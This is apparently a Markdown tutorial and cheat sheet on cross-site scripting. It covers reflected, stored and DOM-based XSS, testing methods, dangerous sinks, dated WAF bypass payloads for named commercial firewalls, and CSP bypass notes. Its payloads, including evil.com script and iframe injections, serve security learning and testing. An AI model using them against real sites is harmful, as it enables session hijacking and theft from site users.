# Cross-Site Scripting (XSS)

> Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject client-side scripts into web pages into a website, which then gets executed in the victim’s browser.

## Summary
- [Methodology](#methodology)
- [Reflected XSS](#reflected-xss).
  - [What is reflected cross-site scripting?](#what-is-reflected-cross---site-scripting?)
  - [How to find and test for reflected XSS vulnerabilities](#How-to-find-and-test-for-reflected-XSS-vulnerabilities)
- [Stored XSS](#stored-xss).
  - [What is stored cross-site scripting?](#What-is-stored-cross---site-scripting?)
  - [How to find and test for stored XSS vulnerabilities](#How-to-find-and-test-for-stored-XSS-vulnerabilities)
- [DOM-based XSS](#DOM-based-xss).
  - [What is DOM-based cross-site scripting?](#What-is-DOM-based-cross---site-scripting?)
  - [How to test for DOM-based cross-site scripting](#How-to-test-for-DOM---based-cross---site-scripting)
  - [Exploiting DOM XSS with different sources and sinks](#Exploiting-DOM-XSS-with-different-sources-and-sinks)
  - [Which sinks can lead to DOM-XSS vulnerabilities?](#Which-sinks-can-lead-to-DOM---XSS-vulnerabilities?)
- [Common WAF Bypass](#Common-WAF-Bypass)
- [CSP Bypass](#CSP-Bypass)
  - [Common CSP Directives](#Common-CSP-Directives)
  - [Common CSP Values](#Common-CSP-Values)
  - [How CSP Can Be Bypassed](#How-CSP-Can-Be-Bypassed)
- [Tools](#tools)
- [References](#references)
- [Resources](#resources)

## Methodology
> XSS allows attackers to inject malicious code into a website, which is then executed in the browser of anyone who visits the site. This can allow attackers to steal sensitive information, such as user login credentials, or to perform other malicious actions.
> There are 3 main types of XSS attacks:

- **Reflected XSS:** the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.
  
- **Stored XSS:** the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post, allowing the attacker to perform various actions.

- **DOM-based XSS:** is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.

## Reflected XSS
### What is reflected cross-site scripting?
Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

FOR EXAMPLE:

a website has a search function which receives the user-supplied search term in a URL parameter:

``
https://insecure-website.com/search?term=gift
``

The application echoes the supplied search term in the response to this URL:

`` <p>You searched for: gift</p>
``

Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:

``
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
``

This URL results in the following response:

``<p>You searched for: <script>/* Bad stuff here... */</script></p>
``

If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application.

### How to find and test for reflected XSS vulnerabilities
> Testing for reflected XSS vulnerabilities manually involves the following steps:

- **Test every entry point.** Test separately every entry point for data within the application's HTTP requests. This includes parameters or other data within the URL query string and message body, and the URL file path. It also includes HTTP headers, although XSS-like behavior that can only be triggered via certain HTTP headers may not be exploitable in practice.

- **Submit random alphanumeric values.** For each entry point, submit a unique random value and determine whether the value is reflected in the response. The value should be designed to survive most input validation, so needs to be fairly short and contain only alphanumeric characters. But it needs to be long enough to make accidental matches within the response highly unlikely. A random alphanumeric value of around 8 characters is normally ideal. 

- **Determine the reflection context.** For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.

- **Test alternative payloads.** If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed.

## Stored XSS
### What is stored cross-site scripting?
> Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

FOR EXAMPLE:

a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:

``
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100
postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
``

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:

``<p>This post was extremely helpful.</p>
``

Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:

``<script>/* Bad stuff here... */</script>
``

Within the attacker's request, this comment would be URL-encoded as:

``comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
``

Any user who visits the blog post will now receive the following within the application's response:

``<p><script>/* Bad stuff here... */</script></p>
``

The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application.

### How to find and test for stored XSS vulnerabilities

> Testing for stored XSS vulnerabilities manually can be challenging. You need to test all relevant "entry points" via which attacker-controllable data can enter the application's processing, and all "exit points" at which that data might appear in the application's responses.

Entry points into the application's processing include:

- Parameters or other data within the URL query string and message body.
- The URL file path.
- HTTP request headers that might not be exploitable in relation to reflected XSS.
- Any out-of-band routes via which an attacker can deliver data into the application. The routes that exist depend entirely on the functionality implemented by the application: a webmail application will process data received in emails; an application displaying a Twitter feed might process data contained in third-party tweets; and a news aggregator will include data originating on other web sites.

The exit points for stored XSS attacks are all possible HTTP responses that are returned to any kind of application user in any situation.

The first step in testing for stored XSS vulnerabilities is to locate the links between entry and exit points, whereby data submitted to an entry point is emitted from an exit point. The reasons why this can be challenging are that:

- Data submitted to any entry point could in principle be emitted from any exit point. For example, user-supplied display names could appear within an obscure audit log that is only visible to some application users.
- Data that is currently stored by the application is often vulnerable to being overwritten due to other actions performed within the application. For example, a search function might display a list of recent searches, which are quickly replaced as users perform other searches.

## DOM-based XSS
### What is DOM-based cross-site scripting?
> DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

The most common source for DOM XSS is the URL, which is typically accessed with the window.location object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. In certain circumstances, such as when targeting a 404 page or a website running PHP, the payload can also be placed in the path.

### How to test for DOM-based cross-site scripting
> To test for DOM-based cross-site scripting manually, you generally need to use a browser with developer tools, such as Chrome. You need to work through each available source in turn, and test each one individually.

**1- Testing HTML sinks**

- Insert a random alphanumeric value into a DOM source such as:

  - location.search

  - location.hash

- Open the browser Developer Tools

- Search for the value inside the DOM

- **Do not use “View Source”**
DOM XSS happens after JavaScript modifies the page, which View Source does not reflect.

  **How to Search**

- In Chrome DevTools:

- Press Ctrl + F

- Search for your injected value in the DOM tree

  **Identifying the Context**

- For every location where the value appears:

- Determine the context:

  - HTML content

  - HTML attribute

  - JavaScript context

- Modify your input based on that context

**Example:**

- If the value appears inside a double-quoted attribute:

  - Try injecting a " to break out of the attribute

**2- Testing JavaScript Execution Sinks**

Why It Is Harder?

- The injected data may not appear in the DOM

- Searching the DOM alone is ineffective

**Testing Method**

  1- Search the page’s JavaScript for sources such as:

  - location

  2- Use:

  - ``Ctrl + Shift + F``
to search across all JavaScript files

  3- Set breakpoints where the source is read

  4- Use the debugger to follow the data flow

**Tracking the Data Flow**

- The source value may:

  - Be assigned to other variables

  - Be passed through multiple functions

- Continue tracking until you find a sink

- Inspect the value before execution

- Refine your payload to test exploitability

  **3- Using DOM Invader**

**Problem**

- Modern JavaScript is often complex or minified

- Manual analysis is slow and error-prone

**Solution**

- Use Burp Suite’s browser with DOM Invader

- DOM Invader:

  - Detects DOM sources automatically

  - Tracks dangerous sinks

  - Simplifies DOM XSS discovery

**Key Takeaways**

- DOM XSS testing is about data flow, not just reflection

- Always identify the context before choosing payloads

- JavaScript execution sinks require debugger-based analysis

- Automated tools like DOM Invader significantly reduce effort

### Exploiting DOM XSS with different sources and sinks
> A website is vulnerable to DOM-based XSS when there is an executable data flow from a source (user-controlled input) to a sink (a DOM method that executes or renders content).
In practice, exploitability depends on the sink type, browser behavior, and any validation or processing performed by the website’s JavaScript.

**Common DOM XSS Sinks**

**1. document.write()**

- Accepts and executes <script> tags.

- Allows direct JavaScript execution.

Example payload:

``document.write('... <script>alert(document.domain)</script> ...');
``

**NOTE:**

Sometimes document.write() is used inside existing HTML context.

You may need to:

- Close existing tags

- Escape surrounding elements
before injecting your payload.

**2. innerHTML**

- Does NOT execute ``<script>`` tags on modern browsers.

- ``svg onload`` will also not fire.

- Requires alternative elements with event handlers.

Working elements:

- img

- iframe

Example payload:

``element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...';
``

**3- DOM XSS via Third-Party Libraries**

> Modern web apps heavily rely on frameworks and libraries, which can introduce additional sources and sinks.

**4- DOM XSS in jQuery**

**1. attr() Sink**

jQuery’s ``attr()`` function can modify DOM attributes.
If user-controlled input is passed to it, XSS may occur.

Vulnerable code example:

``
$(function() {
  $('#backLink').attr(
    "href",
    (new URLSearchParams(window.location.search)).get('returnUrl')
  );
});
``

Exploit payload:

``
?returnUrl=javascript:alert(document.domain)
``

**NOTE: When the victim clicks the link, the JavaScript executes.**

**2. $() Selector Sink**

The jQuery ``$()`` selector can act as a dangerous sink if it receives untrusted input.

Classic Vulnerable Pattern
``
$(window).on('hashchange', function() {
  var element = $(location.hash);
  element[0].scrollIntoView();
});
``

- location.hash is fully user-controlled

- Attacker can inject HTML/XSS payloads

NOTE: Newer jQuery versions block HTML injection when the input starts with ``#``, but older code is still common in the wild.

**4- DOM XSS in AngularJS**

If a framework like AngularJS is used, it may be possible to execute JavaScript without angle brackets or events. When a site uses the ``ng-app`` attribute on an HTML element, it will be processed by AngularJS. In this case, AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes.

### Which sinks can lead to DOM-XSS vulnerabilities?

**The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:**

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

**The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:**

```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

### Common WAF Bypass
> WAFs are designed to filter out malicious content by inspecting incoming and outgoing traffic for patterns indicative of attacks. Despite their sophistication, WAFs often struggle to keep up with the diverse methods attackers use to obfuscate and modify their payloads to circumvent detection.

#### Cloudflare

* 25st January 2021 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg/onrandom=random onload=confirm(1)>
    <video onnull=null onmouseover=confirm(1)>
    ```

* 21st April 2020 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg/OnLoad="`${prompt``}`">
    ```

* 22nd August 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg/onload=%26nbsp;alert`bohdan`+
    ```

* 5th June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    1'"><img/src/onerror=.1|alert``>
    ```

* 3rd June 2019 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

    ```js
    <svg onload=prompt%26%230000000040document.domain)>
    <svg onload=prompt%26%23x000000028;document.domain)>
    xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
    ```

* 22nd March 2019 - @RakeshMane10

    ```js
    <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
    ```

* 27th February 2018

    ```html
    <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
    ```

    ## Chrome Auditor

NOTE: Chrome Auditor is deprecated and removed on latest version of Chrome and Chromium Browser.

* 9th August 2018

    ```javascript
    </script><svg><script>alert(1)-%26apos%3B
    ```

#### Incapsula WAF

* 11th May 2019 - [@daveysec](https://twitter.com/daveysec/status/1126999990658670593)

    ```js
    <svg onload\r\n=$.globalEval("al"+"ert()");>
    ```

* 8th March 2018 - [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)

    ```javascript
    anythinglr00</script><script>alert(document.domain)</script>uxldz
    anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
    ```

* 11th September 2018 - [@c0d3G33k](https://twitter.com/c0d3G33k)

    ```javascript
    <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
    ```

#### Akamai WAF

* 18th June 2018 - [@zseano](https://twitter.com/zseano)

    ```javascript
    ?"></script><base%20c%3D=href%3Dhttps:\mysite>
    ```

* 28th October 2018 - [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480)

    ```svg
    <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
    ```

#### WordFence WAF

* 12th September 2018 - [@brutelogic](https://twitter.com/brutelogic)

    ```html
    <a href=javas&#99;ript:alert(1)>
    ```

#### Fortiweb WAF

* 9th July 2019 - [@rezaduty](https://twitter.com/rezaduty)

    ```javascript
    \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
    ```

## CSP Bypass
> Content Security Policy (CSP) is a browser security mechanism designed to reduce the impact of XSS, data injection, and content injection attacks.

**It works by telling the browser:**

- Which sources are allowed to load content (scripts, images, frames, etc.)
- Which behaviors are forbidden, even if an XSS vulnerability exists

CSP is delivered via:

- HTTP response header

- or <meta> tag

Basic CSP Example:

``
Content-Security-Policy: default-src 'self';
``

Meaning:

- All resources (scripts, images, styles, etc.)

- Can only be loaded from the same origin

### Common CSP Directives

**default-src**

> Defines the fallback policy if no other directive is specified.

Example:

``
Content-Security-Policy: default-src 'self';
``

Meaning:

- Load everything only from the same domain

- External resources are blocked 

XSS impact:

- External scripts like:

``<script src="https://evil.com/x.js"></script>
``

- Blocked

- Dangerous configuration:

``
default-src *
``

Allows loading from anywhere
---
 **script-src (Most Important for XSS)**

> Controls **where JavaScript can be executed from.

Example:

```http
script-src 'self';
```

**Meaning:**

- Only scripts hosted on the same domain are allowed

example:

```http
script-src 'self' 'unsafe-inline';
```

**Why this is bad:**

- allows `'unsafe-inline'`

	- Inline `<script>` blocks

	- Inline event handlers (`onclick`, `onerror`, etc.)

**XSS becomes trivial:**

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```
---
**child-src**

> Controls embedded browsing contexts:

- `iframe`

- `embed`

- `object`

**Example:**

```
child-src https://youtube.com;
```

**Meaning:**

- Only iframes from YouTube are allowed
- 
**Security impact:**

If misconfigured:

```
child-src *
```

You can inject:

```
<iframe src="https://evil.com"></iframe>
```

**Used for:**

- Phishing

- Clickjacking

- XSS chaining
  
---
**frame-src**

> Similar to child-src, but specifically for frames.

Example:

```
frame-src 'self';
```

Browser behavior:

- If `child-src` is missing

- Browser falls back to `frame-src`

Note:

Sometimes `child-src` is strict, but `frame-src` is open.

---
**img-src**

> Controls where images can be loaded from.

Example:

```
img-src 'self' data:;
```

Meaning:

- Images allowed from same origin

- Also allows `data:` URLs

**Why this matters for XSS?**

- `data:` can load SVG images

- SVG can execute JavaScript

Example:

```
<img src="data:image/svg+xml,<svg onload=alert(1)>">
```

- XSS via SVG image

### Common CSP Values

**'none'**

> Blocks loading content from any source.

```
img-src 'none';
```
---
**'self'**

> Allows loading content only from the same origin
(excludes subdomains)

---
**'unsafe-inline'**

Allows:

- Inline scripts

- Inline event handlers

NOTE: Very dangerous with XSS

---
**'unsafe-eval'**

Allows:

- eval()

- new Function()

NOTE: Enables JavaScript code execution

---
**scheme sources**

Example:

```
img-src https:;
```
NOTE: Allows loading content only over a specific protocol

---
**host sources**

Example:

```
script-src https://cdn.example.com;
```
Allows scripts from a specific domain

---
**data:**

Allows inline data like:

- Base64 images

- SVG payloads

Often abused for XSS

--- 
**blob:**

Allows Blob URLs

Can be abused with:

- JavaScript-generated files

- XSS chains

---

**CSP via Meta Tag**

Example:

```
<meta http-equiv="Content-Security-Policy"
content="default-src 'self'; img-src https://site.com;">
```

Equivalent HTTP header:

```
Content-Security-Policy: default-src 'self'; img-src site.com;
```
---
### How CSP Can Be Bypassed
> CSP does not fix XSS, it only limits impact.

**Common bypass techniques:**

- DOM XSS (no inline scripts)

- JSON injection

- Script gadgets

- SVG via img-src data:

- Misconfigured script-src

- Open frame-src or child-src

**Key Takeaway**

> CSP is strong only if configured correctly.

> One weak directive can break the entire protection.

## tools
- [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
- [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
- [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
- [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
- [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester

## References

- [Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212) - Masato Kinugawa's (@kinugawamasato) - July 15, 2016](http://mksben.l0.cm/2016/07/xxn-caret.html)
- [Account Recovery XSS - Gábor Molnár - April 13, 2016](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss)
- [An XSS on Facebook via PNGs & Wonky Content Types - Jack Whitton (@fin1te) - January 27, 2016](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
- [Bypassing Signature-Based XSS Filters: Modifying Script Code - PortSwigger - August 4, 2020](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code)
- [Combination of techniques lead to DOM Based XSS in Google - Sasi Levi - September 19, 2016](http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html)
- [Cross-site scripting (XSS) cheat sheet - PortSwigger - September 27, 2019](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Encoding Differentials: Why Charset Matters - Stefan Schiller - July 15, 2024](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)
- [Facebook's Moves - OAuth XSS - Paulos Yibelo - December 10, 2015](http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html)
- [Frans Rosén on how he got Bug Bounty for Mega.co.nz XSS - Frans Rosén - February 14, 2013](https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/)
- [Google XSS Turkey - Frans Rosén - June 6, 2015](https://labs.detectify.com/2015/06/06/google-xss-turkey/)
- [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) - Marin Moulinier - March 9, 2017](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g)
- [Killing a bounty program, Twice - Itzhak (Zuk) Avraham and Nir Goldshlager - May 2012](http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf)
- [Mutation XSS in Google Search -  Tomasz Andrzej Nidecki - April 10, 2019](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
- [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang - September 26, 2013](https://cure53.de/fp170.pdf)
- [postMessage XSS on a million sites - Mathias Karlsson - December 15, 2016](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
- [RPO that lead to information leakage in Google - @filedescriptor - July 3, 2016](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/)
- [Secret Web Hacking Knowledge: CTF Authors Hate These Simple Tricks - Philippe Dourassov - May 13, 2024](https://youtu.be/Sm4G6cAHjWM)
- [Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP - Frans Rosén (fransrosen) - February 17, 2017](https://hackerone.com/reports/207042)
- [Stored XSS affecting all fantasy sports [*.fantasysports.yahoo.com] - thedawgyg - December 7, 2016](https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/)
- [Stored XSS in *.ebay.com - Jack Whitton (@fin1te) - January 27, 2013](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/)
- [Stored XSS In Facebook Chat, Check In, Facebook Messenger - Nirgoldshlager - April 17, 2013](http://web.archive.org/web/20130420095223/http://www.breaksec.com/?p=6129)
- [Stored XSS on developer.uber.com via admin account compromise in Uber - James Kettle (@albinowax) - July 18, 2016](https://hackerone.com/reports/152067)
- [Stored XSS on Snapchat - Mrityunjoy - February 9, 2018](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
- [Stored XSS, and SSRF in Google using the Dataset Publishing Language - Craig Arendt - March 7, 2018](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
- [Tricky HTML Injection and Possible XSS in sms-be-vip.twitter.com - Ahmed Aboul-Ela (@aboul3la) - July 9, 2016](https://hackerone.com/reports/150179)
- [Twitter XSS by stopping redirection and javascript scheme - Sergey Bobrov (bobrov) - September 30, 2017](https://hackerone.com/reports/260744)
- [Uber Bug Bounty: Turning Self-XSS into Good XSS - Jack Whitton (@fin1te) - March 22, 2016](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)
- [Uber Self XSS to Global XSS - httpsonly - August 29, 2016](https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html)
- [Unleashing an Ultimate XSS Polyglot - Ahmed Elsobky - February 16, 2018](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
- [Using a Braun Shaver to Bypass XSS Audit and WAF - Frans Rosen - April 19, 2016](http://web.archive.org/web/20160810033728/https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify)
- [Ways to alert(document.domain) - Tom Hudson (@tomnomnom) - February 22, 2018](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)
- [Write-up of DOMPurify 2.0.0 bypass using mutation XSS - Michał Bentkowski - September 20, 2019](https://research.securitum.com/dompurify-bypass-using-mxss/)
- [XSS by Tossing Cookies - WeSecureApp - July 10, 2017](https://wesecureapp.com/blog/xss-by-tossing-cookies/)
- [XSS ghettoBypass - d3adend - September 25, 2015](http://d3adend.org/xss/ghettoBypass)
- [XSS in Uber via Cookie - zhchbin - August 30, 2017](http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/)
- [XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener - Luke Young (bored-engineer) - May 23, 2017](https://hackerone.com/reports/231053)
- [XSS via Host header - www.google.com/cse - Michał Bentkowski - April 22, 2015](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
- [Xssing Web With Unicodes - Rakesh Mane - August 3, 2017](http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html)
- [Yahoo Mail stored XSS - Jouko Pynnönen - January 19, 2016](https://klikki.fi/adv/yahoo.html)
- [Yahoo Mail stored XSS #2 - Jouko Pynnönen - December 8, 2016](https://klikki.fi/adv/yahoo2.html)

## Resources
- [PayloadsAllTheThings/XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [PortSwigger Academy](https://portswigger.net/web-security/cross-site-scripting)
- [NahamSec Course](https://app.hackinghub.io/course)
- [ChatGPT](https://chatgpt.com/)
- [Cross-Site Scripting (XSS) Tutorial](https://www.youtube.com/playlist?list=PLVLbIIcGrsT7JLzxjD8lvAmR_OSFQwrxg)





